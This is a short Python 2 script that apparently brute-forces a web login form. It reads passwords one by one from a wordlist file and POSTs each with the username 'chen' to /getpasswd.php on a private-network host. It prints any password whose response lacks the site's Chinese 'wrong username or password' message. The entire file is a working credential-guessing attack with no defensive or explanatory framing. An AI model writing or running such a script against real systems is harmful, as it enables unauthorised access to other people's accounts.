#coding:utf-8
import urllib2
import urllib
import httplib

headers = {"Content-Type":"application/x-www-form-urlencoded",     
           "Connection":"Keep-Alive",
           "Referer":"http://192.168.0.117/getpasswd.php"};

def tryPasswd(passwd):
	global headers
	print passwd
	conn = httplib.HTTPConnection("192.168.0.117")
	passwd = passwd.strip()
	params = urllib.urlencode({'username':'chen','passwd':passwd})
	conn.request(method="POST",url="/getpasswd.php",body=params,headers=headers)
	responseText = conn.getresponse().read().decode('utf-8')
	#print responseText
	if responseText.find(u'用户名或密码错误') < 0:
		print 'password is:%s' % passwd
	return

if __name__ == '__main__':
	with open(r'cnpassword.txt','r') as fpass:
		for passwd in fpass.readlines():
			tryPasswd(passwd)
                        
